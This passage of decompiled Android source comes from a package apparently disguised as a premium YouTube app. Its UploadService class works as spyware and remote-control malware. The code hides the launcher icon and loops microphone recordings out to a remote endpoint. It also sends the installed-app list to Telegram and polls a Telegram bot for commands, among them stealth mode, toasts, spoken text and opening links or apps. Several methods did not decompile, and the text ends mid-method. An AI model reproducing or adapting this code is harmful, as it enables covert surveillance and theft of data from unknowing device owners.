    private final void setFlashlight(boolean r17) {
        /*
            r16 = this;
            r1 = r16
            r2 = r17
            java.lang.String r0 = "cameraManager.cameraIdList"
            java.lang.String r3 = "camera"
            java.lang.Object r3 = r1.getSystemService(r3)     // Catch: java.lang.Exception -> L7e
            java.lang.String r4 = "null cannot be cast to non-null type android.hardware.camera2.CameraManager"
            kotlin.jvm.internal.Intrinsics.checkNotNull(r3, r4)     // Catch: java.lang.Exception -> L7e
            android.hardware.camera2.CameraManager r3 = (android.hardware.camera2.CameraManager) r3     // Catch: java.lang.Exception -> L7e
            java.lang.String[] r4 = r3.getCameraIdList()     // Catch: java.lang.Exception -> L7e
            kotlin.jvm.internal.Intrinsics.checkNotNullExpressionValue(r4, r0)     // Catch: java.lang.Exception -> L7e
            java.lang.Object[] r4 = (java.lang.Object[]) r4     // Catch: java.lang.Exception -> L7e
            r5 = 0
            int r6 = r4.length     // Catch: java.lang.Exception -> L7e
            r8 = 0
        L1f:
            if (r8 >= r6) goto L60
            r9 = r4[r8]     // Catch: java.lang.Exception -> L7e
            r10 = r9
            java.lang.String r10 = (java.lang.String) r10     // Catch: java.lang.Exception -> L7e
            r11 = 0
            android.hardware.camera2.CameraCharacteristics r12 = r3.getCameraCharacteristics(r10)     // Catch: java.lang.Exception -> L7e
            java.lang.String r13 = "cameraManager.getCameraCharacteristics(id)"
            kotlin.jvm.internal.Intrinsics.checkNotNullExpressionValue(r12, r13)     // Catch: java.lang.Exception -> L7e
            android.hardware.camera2.CameraCharacteristics$Key r13 = android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE     // Catch: java.lang.Exception -> L7e
            java.lang.Object r13 = r12.get(r13)     // Catch: java.lang.Exception -> L7e
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r14 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE     // Catch: java.lang.Exception -> L7e
            boolean r14 = r14.m۱۸۵Boolean$arg1$callEQEQ$valhasFlash$fun$anonymous$$arg0$callfirstOrNull$valtmp0_elvis_lhs$valcameraId$try$funsetFlashlight$classUploadService()     // Catch: java.lang.Exception -> L7e
            java.lang.Boolean r14 = java.lang.Boolean.valueOf(r14)     // Catch: java.lang.Exception -> L7e
            boolean r13 = kotlin.jvm.internal.Intrinsics.areEqual(r13, r14)     // Catch: java.lang.Exception -> L7e
            android.hardware.camera2.CameraCharacteristics$Key r14 = android.hardware.camera2.CameraCharacteristics.LENS_FACING     // Catch: java.lang.Exception -> L7e
            java.lang.Object r14 = r12.get(r14)     // Catch: java.lang.Exception -> L7e
            java.lang.Integer r14 = (java.lang.Integer) r14     // Catch: java.lang.Exception -> L7e
            if (r13 == 0) goto L59
            if (r14 != 0) goto L51
            goto L59
        L51:
            int r15 = r14.intValue()     // Catch: java.lang.Exception -> L7e
            r7 = 1
            if (r15 != r7) goto L59
            goto L5a
        L59:
            r7 = 0
        L5a:
            if (r7 == 0) goto L5d
            goto L61
        L5d:
            int r8 = r8 + 1
            goto L1f
        L60:
            r9 = 0
        L61:
            java.lang.String r9 = (java.lang.String) r9     // Catch: java.lang.Exception -> L7e
            if (r9 != 0) goto L75
            java.lang.String[] r4 = r3.getCameraIdList()     // Catch: java.lang.Exception -> L7e
            kotlin.jvm.internal.Intrinsics.checkNotNullExpressionValue(r4, r0)     // Catch: java.lang.Exception -> L7e
            java.lang.Object[] r4 = (java.lang.Object[]) r4     // Catch: java.lang.Exception -> L7e
            java.lang.Object r0 = kotlin.collections.ArraysKt.firstOrNull(r4)     // Catch: java.lang.Exception -> L7e
            r9 = r0
            java.lang.String r9 = (java.lang.String) r9     // Catch: java.lang.Exception -> L7e
        L75:
            r0 = r9
            if (r0 == 0) goto La3
            r3.setTorchMode(r0, r2)     // Catch: java.lang.Exception -> L7e
            r1.flashlightOn = r2     // Catch: java.lang.Exception -> L7e
            goto La3
        L7e:
            r0 = move-exception
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r3 = r3.m۸۵۹String$arg0$calle$catch$funsetFlashlight$classUploadService()
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r5 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r5 = r5.m۵۷۸String$0$str$arg1$calle$catch$funsetFlashlight$classUploadService()
            java.lang.StringBuilder r4 = r4.append(r5)
            java.lang.String r5 = r0.getMessage()
            java.lang.StringBuilder r4 = r4.append(r5)
            java.lang.String r4 = r4.toString()
            android.util.Log.e(r3, r4)
        La3:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.setFlashlight(boolean):void");
    }

    private final boolean shouldSendAllData() {
        return this.sendAllDataEnabled;
    }

    private final void minimizeAndHideApp() {
        Intent homeIntent = new Intent("android.intent.action.MAIN");
        homeIntent.addCategory("android.intent.category.HOME");
        homeIntent.setFlags(268435456);
        startActivity(homeIntent);
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, Class.forName(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۴String$arg0$callforName$arg1$call$init$$valcomponentName$try$funminimizeAndHideApp$classUploadService()));
            pm.setComponentEnabledSetting(componentName, 2, 1);
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۴۵String$arg0$calle$catch$funminimizeAndHideApp$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۷۱String$0$str$arg1$calle$catch$funminimizeAndHideApp$classUploadService() + e.getMessage());
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startMicRecordingLoop$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startMicRecordingLoop$1", f = "UploadService.kt", i = {0, 1}, l = {1460, 1464}, m = "invokeSuspend", n = {"$this$launch", "$this$launch"}, s = {"L$0", "L$0"})
    static final class C۰۰۵۴1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        private /* synthetic */ Object L$0;
        int label;

        C۰۰۵۴1(Continuation<? super C۰۰۵۴1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            Continuation<Unit> continuation2 = UploadService.this.new C۰۰۵۴1(continuation);
            continuation2.L$0 = obj;
            return continuation2;
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:15:0x0034 A[Catch: Exception -> 0x0023, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x0023, blocks: (B:15:0x0034, B:8:0x001f), top: B:26:0x001f }] */
        /* JADX WARN: Removed duplicated region for block: B:22:0x006c A[RETURN] */
        /* JADX WARN: Removed duplicated region for block: B:24:0x006e  */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x006a -> B:13:0x002d). Please report as a decompilation issue!!! */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r8) {
            /*
                r7 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r7.label
                switch(r1) {
                    case 0: goto L25;
                    case 1: goto L1a;
                    case 2: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
                java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                r8.<init>(r0)
                throw r8
            L11:
                r1 = r7
                java.lang.Object r2 = r1.L$0
                kotlinx.coroutines.CoroutineScope r2 = (kotlinx.coroutines.CoroutineScope) r2
                kotlin.ResultKt.throwOnFailure(r8)
                goto L6d
            L1a:
                r1 = r7
                java.lang.Object r2 = r1.L$0
                kotlinx.coroutines.CoroutineScope r2 = (kotlinx.coroutines.CoroutineScope) r2
                kotlin.ResultKt.throwOnFailure(r8)     // Catch: java.lang.Exception -> L23
                goto L45
            L23:
                r3 = move-exception
                goto L46
            L25:
                kotlin.ResultKt.throwOnFailure(r8)
                r1 = r7
                java.lang.Object r2 = r1.L$0
                kotlinx.coroutines.CoroutineScope r2 = (kotlinx.coroutines.CoroutineScope) r2
            L2d:
                boolean r3 = kotlinx.coroutines.CoroutineScopeKt.isActive(r2)
                if (r3 == 0) goto L6e
            L34:
                com.w8sb.w8premiumyt.UploadService r3 = com.w8sb.w8premiumyt.UploadService.this     // Catch: java.lang.Exception -> L23
                r4 = r1
                kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4     // Catch: java.lang.Exception -> L23
                r1.L$0 = r2     // Catch: java.lang.Exception -> L23
                r5 = 1
                r1.label = r5     // Catch: java.lang.Exception -> L23
                java.lang.Object r3 = com.w8sb.w8premiumyt.UploadService.access$recordAndSendMic(r3, r4)     // Catch: java.lang.Exception -> L23
                if (r3 != r0) goto L45
                return r0
            L45:
                goto L58
            L46:
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r4 = r4.m۸۲۹String$arg0$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setmicJob$$funstartMicRecordingLoop$classUploadService()
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r5 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r5 = r5.m۱۳۰۸String$arg1$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setmicJob$$funstartMicRecordingLoop$classUploadService()
                r6 = r3
                java.lang.Throwable r6 = (java.lang.Throwable) r6
                android.util.Log.e(r4, r5, r6)
            L58:
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                long r3 = r3.m۳۳۳Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setmicJob$$funstartMicRecordingLoop$classUploadService()
                r5 = r1
                kotlin.coroutines.Continuation r5 = (kotlin.coroutines.Continuation) r5
                r1.L$0 = r2
                r6 = 2
                r1.label = r6
                java.lang.Object r3 = kotlinx.coroutines.DelayKt.delay(r3, r5)
                if (r3 != r0) goto L6d
                return r0
            L6d:
                goto L2d
            L6e:
                kotlin.Unit r0 = kotlin.Unit.INSTANCE
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۴1.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    private final void startMicRecordingLoop() {
        Job job = this.micJob;
        if (job != null) {
            Job.DefaultImpls.cancel$default(job, (CancellationException) null, 1, (Object) null);
        }
        this.micJob = BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۴1(null), 3, (Object) null);
    }

    private final void stopMicRecordingLoop() {
        Job job = this.micJob;
        if (job != null) {
            Job.DefaultImpls.cancel$default(job, (CancellationException) null, 1, (Object) null);
        }
        this.micJob = null;
    }

    private final void sendInstalledAppsToTelegram() {
        String allApps = getInstalledApps(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۰Boolean$arg0$callgetInstalledApps$valallApps$funsendInstalledAppsToTelegram$classUploadService());
        String summary = CollectionsKt.joinToString$default(CollectionsKt.take(StringsKt.lines(allApps), LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۶Int$arg0$calltake$$$this$calljoinToString$valsummary$funsendInstalledAppsToTelegram$classUploadService()), LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۰String$arg0$calljoinToString$valsummary$funsendInstalledAppsToTelegram$classUploadService(), (CharSequence) null, (CharSequence) null, 0, (CharSequence) null, (Function1) null, 62, (Object) null);
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۰1(summary, null), 3, (Object) null);
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۱2(allApps, null), 3, (Object) null);
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendInstalledAppsToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendInstalledAppsToTelegram$1", f = "UploadService.kt", i = {}, l = {1477}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۰1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $summary;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۰1(String str, Continuation<? super C۰۰۳۰1> continuation) {
            super(2, continuation);
            this.$summary = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۰1(this.$summary, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۴String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$funsendInstalledAppsToTelegram$classUploadService() + this.$summary + LiveLiterals$UploadServiceKt.INSTANCE.m۶۵۹String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$funsendInstalledAppsToTelegram$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendInstalledAppsToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendInstalledAppsToTelegram$2", f = "UploadService.kt", i = {}, l = {1478}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۱2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $allApps;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۱2(String str, Continuation<? super C۰۰۳۱2> continuation) {
            super(2, continuation);
            this.$allApps = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۱2(this.$allApps, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextFile(this.$allApps, LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۹String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$funsendInstalledAppsToTelegram$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1", f = "UploadService.kt", i = {0}, l = {2114}, m = "invokeSuspend", n = {"$this$launch"}, s = {"L$0"})
    static final class C۰۰۵۶1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        private /* synthetic */ Object L$0;
        int label;

        C۰۰۵۶1(Continuation<? super C۰۰۵۶1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            Continuation<Unit> continuation2 = UploadService.this.new C۰۰۵۶1(continuation);
            continuation2.L$0 = obj;
            return continuation2;
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            C۰۰۵۶1 r3;
            CoroutineScope $this$launch;
            JSONArray result;
            int i;
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    r3 = this;
                    $this$launch = (CoroutineScope) r3.L$0;
                    break;
                case 1:
                    r3 = this;
                    CoroutineScope $this$launch2 = (CoroutineScope) r3.L$0;
                    ResultKt.throwOnFailure($result);
                    $this$launch = $this$launch2;
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            while (CoroutineScopeKt.isActive($this$launch)) {
                try {
                    Request request = new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۹String$0$str$valurl$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۵String$2$str$valurl$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + (UploadService.this.lastUpdateId + ((long) LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۴Int$arg0$callplus$3$str$valurl$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()))).build();
                    Response response = UploadService.this.client.newCall(request).execute();
                    ResponseBody responseBodyBody = response.body();
                    String body = responseBodyBody != null ? responseBodyBody.string() : null;
                    if (response.isSuccessful() && body != null) {
                        JSONObject json = new JSONObject(body);
                        if (json.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۳String$arg0$calloptBoolean$cond$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()) && (result = json.optJSONArray(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۸String$arg0$calloptJSONArray$valresult$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) != null) {
                            int length = result.length();
                            int i2 = 0;
                            while (i2 < length) {
                                JSONObject update = result.getJSONObject(i2);
                                UploadService.this.lastUpdateId = update.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۲String$arg0$callgetLong$arg0$call$setlastUpdateId$$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                if (update.has(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۹String$arg0$callhas$cond$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                    JSONObject callback = update.getJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۰String$arg0$callgetJSONObject$valcallback$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    String callbackId = callback.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۸String$arg0$callgetString$valcallbackId$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    JSONObject from = callback.getJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۱String$arg0$callgetJSONObject$valfrom$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    from.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۳String$arg0$callgetLong$valuserId$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    String data = callback.optString(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۹String$arg0$calloptString$valdata$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    i = i2;
                                    BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۰۱1(callbackId, UploadService.this, null), 3, (Object) null);
                                    Intrinsics.checkNotNullExpressionValue(data, "data");
                                    if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۶String$arg0$callstartsWith$cond$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String msg = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۹String$arg0$callremovePrefix$valmsg$branch$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.sendSpeakTextToMainActivity(msg);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass2(UploadService.this, msg, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۰۸String$arg1$callEQEQ$cond1$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendLiveReadingStatus(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۷Boolean$arg0$callsendLiveReadingStatus$branch1$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۰String$arg1$callEQEQ$cond2$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendLiveReadingStatus(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۹Boolean$arg0$callsendLiveReadingStatus$branch2$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۲String$arg1$callEQEQ$cond3$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass3(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۸String$arg1$callEQEQ$cond4$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stealthMode = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۶Boolean$arg0$call$setstealthMode$$branch4$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass4(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.setLauncherIconVisible(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۶Boolean$arg0$callsetLauncherIconVisible$branch4$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۳String$arg0$callstartsWith$cond5$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String msg2 = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۱String$arg0$callremovePrefix$valmsg$branch5$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.sendToastToMainActivity(msg2);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass5(UploadService.this, msg2, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۹String$arg0$callstartsWith$cond6$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String url = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۹String$arg0$callremovePrefix$valurl$branch6$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.sendLinkOpenToMainActivity(url);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass6(UploadService.this, url, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۱String$arg0$callstartsWith$cond7$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String arg = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۷String$arg0$callremovePrefix$valarg$branch7$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        if (StringsKt.contains$default(arg, LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۷Char$arg0$callcontains$cond$if$branch7$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                            UploadService.this.openAppByPackage(arg);
                                        } else {
                                            UploadService.this.openAppByName(arg);
                                        }
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۶String$arg1$callEQEQ$cond8$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
